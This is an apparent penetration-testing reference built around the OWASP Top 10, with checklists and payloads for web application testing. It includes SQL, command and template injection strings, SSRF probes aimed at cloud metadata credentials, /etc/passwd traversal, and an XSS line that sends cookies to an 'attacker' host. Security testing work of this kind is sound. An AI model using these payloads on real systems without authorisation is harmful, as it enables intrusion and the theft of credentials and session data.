# K-0 · OWASP Top 10 & Web Application Testing

Web apps are the most common attack surface.
This is K-0's complete reference for finding and validating web vulnerabilities.

---

## OWASP Top 10 (2021) — Operational Checklist

### A01 — Broken Access Control (Most common)
**What it means:** Users can access resources or perform actions they shouldn't.

**Test for:**
```
- Horizontal privilege escalation: change ID in URL from your user to another
  /api/users/1234/profile → /api/users/1235/profile
  
- Vertical privilege escalation: access admin functions as regular user
  /admin/users, /admin/config — try directly even if no link
  
- IDOR (Insecure Direct Object Reference):
  Download link: /download?file=invoice_1234.pdf → try invoice_1235.pdf
  
- Missing function-level access control:
  DELETE /api/users/1234 — does the app check if you're admin?
  
- JWT token manipulation: decode with jwt.io, change role claims
  
- CORS misconfiguration:
  Check: Access-Control-Allow-Origin: * or reflecting arbitrary Origin header
```

**Tools:** Burp Suite repeater, IDOR scanner, JWT.io

---

### A02 — Cryptographic Failures
**What it means:** Sensitive data transmitted or stored insecurely.

**Test for:**
```bash
# TLS version and cipher strength
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target

# Look for:
# - TLS 1.0/1.1 still supported
# - SSLv3 (POODLE)
# - Weak ciphers (RC4, DES, EXPORT)
# - No HSTS header
# - HTTP redirect to HTTPS (but what about the initial HTTP request?)

# HTTP (not HTTPS) transmission of sensitive data
# → Watch login forms and API tokens in network traffic
# → Check cookies: Secure flag missing? HttpOnly flag missing?
```

---

### A03 — Injection (SQL, NoSQL, LDAP, Command, XPath)
**What it means:** Untrusted data sent to an interpreter as commands.

**SQL Injection:**
```bash
# Manual test: add ' and see if error
' OR '1'='1
' OR 1=1; --
' UNION SELECT null,null,null; --

# Automated
sqlmap -u "http://target/page?id=1" --batch --level=3 --risk=2
sqlmap -r burp_request.txt --batch

# Error-based: read the error message for databse info
# Blind: boolean/time-based when no output visible
# Time-based: ' AND SLEEP(5); --
```

**Command Injection:**
```bash
# Test in any field that might touch the filesystem/OS
; ls
| whoami
`id`
$(id)

# URL encoded
%3B+ls
%7C+whoami

# Blind (confirm with callback)
; ping -c 1 your-burp-collaborator.net
; curl http://your-server/$(whoami)
```

**SSTI (Server-Side Template Injection):**
```
{{7*7}} → should return 49 if vulnerable (Jinja2, Twig)
${7*7} → FreeMarker
<%= 7 * 7 %> → ERB
#{7*7} → Ruby

# Escalate to RCE with template-specific payload
# Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

### A04 — Insecure Design
**What it means:** Flaws in the way the application was designed.

**Test for:**
```
- Password reset that relies on security questions (guessable)
- "Remember me" that stores credentials in plaintext cookie
- Business logic flaws: buy item, refund, keep item
- Race conditions: two simultaneous requests exploiting timing
- No rate limiting on login, OTP, or password reset
- Predictable resource locations (/backup, /old, /test)
```

---

### A05 — Security Misconfiguration (Very common in practice)
**What it means:** Missing hardening, default credentials, exposed admin interfaces.

```bash
# Default credentials to always try
admin:admin, admin:password, admin:123456, root:root, guest:guest
admin:[company_name], admin:[domain_name]
# Check: https://www.default-password.info

# Exposed admin interfaces
/admin, /administrator, /wp-admin, /phpmyadmin, /console
/manager (Tomcat), /_cpanel, /plesk, /cpanel
/jenkins, /grafana, /kibana, /prometheus

# Directory listing
curl -s http://target/js/ | grep "Index of"

# Debug/info endpoints
/phpinfo.php, /info.php
/actuator, /actuator/env, /actuator/heapdump (Spring Boot)
/debug, /trace, /metrics

# Error messages with stack traces
Send malformed input, look for:
- Framework version in errors
- Internal file paths
- Database query structure
- Library versions
```

---

### A06 — Vulnerable and Outdated Components
```bash
# Web tech fingerprinting
whatweb http://target
wappalyzer (browser extension)

# Check versions against CVE databases
searchsploit [component] [version]
nvd.nist.gov → search CVEs

# Common high-value targets:
# - Log4j anywhere you see Java (CVE-2021-44228)
# - Outdated WordPress plugins
# - Old jQuery (XSS gadgets)
# - Struts2 (CVE-2017-5638 was Equifax breach)
# - Spring4Shell (CVE-2022-22965)
```

---

### A07 — Identification and Authentication Failures
```bash
# Username enumeration
# Different response for valid vs invalid user:
# "User not found" vs "Wrong password" = vulnerable
# Response time difference (hash computed only for valid users)

# Session management
# - Session token in URL (visible in logs, referrer)
# - Short session tokens (brute forceable)
# - Token doesn't change after login (session fixation)
# - No session invalidation on logout (reuse old token)

# Multi-factor bypass
# - Change user ID in MFA request to another user
# - Skip MFA step entirely in multi-step login
# - Reuse OTP (replay attack)
# - Brute force OTP with no rate limit
```

---

### A08 — Software and Data Integrity Failures
```bash
# Check if app loads external resources without integrity checks
<script src="https://cdn.example.com/lib.js">  # no SRI hash

# CI/CD pipeline: can you modify build artifacts?
# Deserialization: does app accept serialized objects?

# Prototype pollution (JavaScript)
# XSS via __proto__.__defineGetter__(...)
```

---

### A09 — Security Logging and Monitoring Failures
```bash
# Test: does the app log failed login attempts?
# Does it alert on multiple failed logins?
# Are logs accessible to attackers? (/logs, /log, /app.log)
# Do logs contain sensitive data? (passwords in GET params logged)
```

---

### A10 — Server-Side Request Forgery (SSRF)
**What it means:** App fetches a remote resource with attacker-controlled URL.

```bash
# Find: any URL input field, webhook URL, image URL, PDF generator, import from URL

# Test payloads
http://127.0.0.1/
http://localhost/admin
http://169.254.169.254/latest/meta-data/   # AWS metadata (credential theft)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata endpoints
# AWS: 169.254.169.254
# GCP: 169.254.169.254 or metadata.google.internal
# Azure: 169.254.169.254

# Bypass filters
http://2130706433/       # 127.0.0.1 in decimal
http://0177.0.0.01/     # 127.0.0.1 in octal
http://[::1]/           # IPv6 localhost
http://attacker.com/redirect → 127.0.0.1  # redirect to bypass

# SSRF to internal services
http://127.0.0.1:8080/admin
http://10.0.0.1/     # internal hosts
http://192.168.1.1/  # router admin
```

---

## Web Testing Methodology (Full Checklist)

### Passive Phase
- [ ] Spider the application (Burp Spider or manual)
- [ ] Identify all entry points (forms, URL params, headers, cookies)
- [ ] Map authentication flows and session handling
- [ ] Identify tech stack (headers, error messages, HTML comments)
- [ ] Check robots.txt, sitemap.xml

### Information Disclosure
- [ ] HTTP response headers (Server, X-Powered-By, X-AspNet-Version)
- [ ] HTML comments (<!-- dev: remove this -->)
- [ ] JavaScript files — API keys, endpoints, credentials
- [ ] Error pages — stack traces, paths, DB info
- [ ] .git, .svn, .DS_Store exposed

### Authentication & Session
- [ ] Username enumeration (response timing/content)
- [ ] Password policy (try: a, 123, password)
- [ ] Account lockout policy (50 failed attempts)
- [ ] Session token entropy (decode, check randomness)
- [ ] Cookie flags (Secure, HttpOnly, SameSite)
- [ ] Remember-me functionality
- [ ] Password reset flow

### Business Logic
- [ ] Can you skip steps in multi-step processes?
- [ ] Can you submit negative values or values out of range?
- [ ] Do you need to pay? What if you modify the amount?
- [ ] Race conditions on critical operations

### Input Validation
- [ ] SQL injection on all parameters
- [ ] XSS (reflected, stored, DOM-based)
- [ ] Command injection
- [ ] SSTI
- [ ] Path traversal (../../etc/passwd)
- [ ] XML injection / XXE
- [ ] Open redirect (?redirect=http://evil.com)

### API Testing
- [ ] Try all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)
- [ ] Mass assignment (send extra JSON fields)
- [ ] API version enumeration (/api/v1, /api/v2)
- [ ] GraphQL introspection (__schema)
- [ ] JWT: none algorithm, weak secret, algorithm confusion

---

## XSS Quick Reference

```javascript
// Reflected XSS test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)

// DOM XSS — look for: innerHTML, document.write, eval, setTimeout with user input

// Stored XSS — submit in all stored fields, check every page that renders it

// Steal cookies
<script>document.location='http://attacker/steal?c='+document.cookie</script>

// Bypass CSP
<script src="https://allowed-cdn.com/angular.js"></script>
{{constructor.constructor('alert(1)')()}}
```

---

## Common Web Vulnerabilities Cheat Sheet

| Vulnerability | Quick Test | Tools |
|--------------|-----------|-------|
| SQLi | `'` in params | sqlmap, manual |
| XSS | `<script>alert(1)` | XSStrike, Dalfox |
| SSRF | `http://169.254.169.254` in URL fields | Burp Collaborator |
| XXE | XML with DOCTYPE | manual, Burp |
| LFI | `?file=../../etc/passwd` | manual, ffuf |
| RFI | `?page=http://attacker/` | manual |
| Open redirect | `?next=http://evil.com` | manual |
| IDOR | change ID in requests | manual, Autorepeater |
| CSRF | check for token in state-changing requests | manual |
| JWT | jwt.io — none alg, weak secret | jwt_tool |
